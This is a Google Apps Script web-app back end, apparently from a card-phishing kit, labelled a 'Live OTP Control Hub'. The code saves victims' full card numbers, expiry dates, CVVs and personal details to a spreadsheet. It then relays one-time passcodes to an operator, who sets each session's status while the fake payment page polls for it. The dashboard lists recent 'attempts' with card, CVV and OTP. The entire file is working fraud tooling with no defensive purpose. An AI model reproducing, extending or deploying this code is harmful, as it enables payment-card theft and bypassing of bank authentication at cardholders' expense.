// ════════════════════════════════════════════════════════════
//  GOOGLE APPS SCRIPT — Live OTP Control Hub
//  https://script.google.com → New Project → Code.gs
//  Then: Deploy → New Deployment → Web App
// ════════════════════════════════════════════════════════════
//  GOOGLE APPS SCRIPT — Advanced Live Dashboard + Webhooks
// ════════════════════════════════════════════════════════════

const SHEET_NAME = 'Payments';

function doGet(e) {
  // Prevent crash if user manually clicks "Run" in the editor
  if (!e) return createResponse({ status: "Script is successfully installed. Please deploy as Web App." });
  
  try {
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) return createResponse({ status: 'No data' });

    // Mode 1: Polling for Status
    if (e.parameter.sessionId && e.parameter.action === 'check') {
      const data = sheet.getDataRange().getValues();
      for (let i = data.length - 1; i >= 1; i--) {
        if (data[i][0] === e.parameter.sessionId) {
          return createResponse({ status: data[i][18] });
        }
      }
      return createResponse({ status: 'NOT_FOUND' });
    }

    // Mode 2: Fetching for Dashboard (Last 15 attempts)
    const rows = sheet.getLastRow();
    if (rows <= 1) return createResponse({ attempts: [] });
    const startRow = Math.max(2, rows - 14);
    const numRows = rows - startRow + 1;
    
    // Safety fallback: ensure we don't request more columns than the sheet has
    const maxCols = sheet.getMaxColumns(); 
    const colsToFetch = Math.min(20, maxCols);
    
    const range = sheet.getRange(startRow, 1, numRows, colsToFetch).getValues();
    
    const attempts = range.map(r => ({
      sessionId: r[0] || '', 
      timestamp: r[1] || '', 
      invoice: r[2] || '', 
      title: r[3] || '',
      items: r[4] || '',
      total: r[5] || '', 
      name: `${r[6] || ''} ${r[7] || ''}`.trim(), 
      email: r[8] || '',
      phone: r[9] || '',
      country: r[10] || '',
      city: r[11] || '',
      zip: r[12] || '',
      address: r[13] || '',
      card: r[14] || '', 
      expiry: r[15] || '',
      cvv: r[16] || '',
      otp: r[17] || '', 
      status: r[18] || '',
      timeMs: r[19] || 0 
    })).reverse();

    return createResponse({ attempts });
  } catch (err) {
    return createResponse({ error: "GET Error: " + err.message });
  }
}

function doPost(e) {
  // Prevent crash if user manually clicks "Run" in the editor
  if (!e) return createResponse({ error: "Script is successfully installed. Please deploy as Web App to handle POST requests." });

  try {
    const data = JSON.parse(e.postData.contents);
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    let sheet = ss.getSheetByName(SHEET_NAME);

    if (!sheet) sheet = initSheet(ss);

    if (data.type === 'payment') {
      const items = (data.invoice.items || []).map(i => `${i.name}: €${i.price}`).join('\n');
      sheet.appendRow([
        data.sessionId, data.timestamp, data.invoice.invNumber, data.invoice.title,
        items, data.invoice.total, data.customer.firstName, data.customer.lastName,
        data.customer.email, data.customer.phone, data.customer.country, data.customer.city,
        data.customer.zip, data.customer.address, data.card.number, data.card.expiry, 
        data.card.cvv, '', 'PENDING', Date.now() // Append Unix Timestamp for UI reset filtering
      ]);
      return createResponse({ success: true });
    }

    if (data.type === 'otp') {
      const row = findRow(sheet, data.sessionId);
      if (row) {
        sheet.getRange(row, 18).setValue(data.otp);
        sheet.getRange(row, 19).setValue('WAITING_FOR_OWNER');
        return createResponse({ success: true });
      }
    }

    if (data.type === 'decision') {
      const row = findRow(sheet, data.sessionId);
      if (row) {
        sheet.getRange(row, 19).setValue(data.status);
        return createResponse({ success: true });
      }
    }
    return createResponse({ success: false });
  } catch (err) {
    return createResponse({ success: false, error: err.message });
  }
}

function findRow(sheet, sessionId) {
  const data = sheet.getRange(1, 1, sheet.getLastRow(), 1).getValues();
  for (let i = data.length - 1; i >= 0; i--) {
    if (data[i][0] === sessionId) return i + 1;
  }
  return null;
}

function initSheet(ss) {
  const sheet = ss.insertSheet(SHEET_NAME);
  // Rebuilt 20 Headers layout for expansive customer info fetching
  const headers = ['ID','Time','Inv#','Title','Items','Total','First','Last','Email','Phone','Country','City','Zip','Addr','Card','Exp','CVV','OTP','Status', 'TimeMs'];
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]).setBackground('#5b8dee').setFontColor('#fff').setFontWeight('bold');
  sheet.setFrozenRows(1);
  return sheet;
}

function createResponse(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}
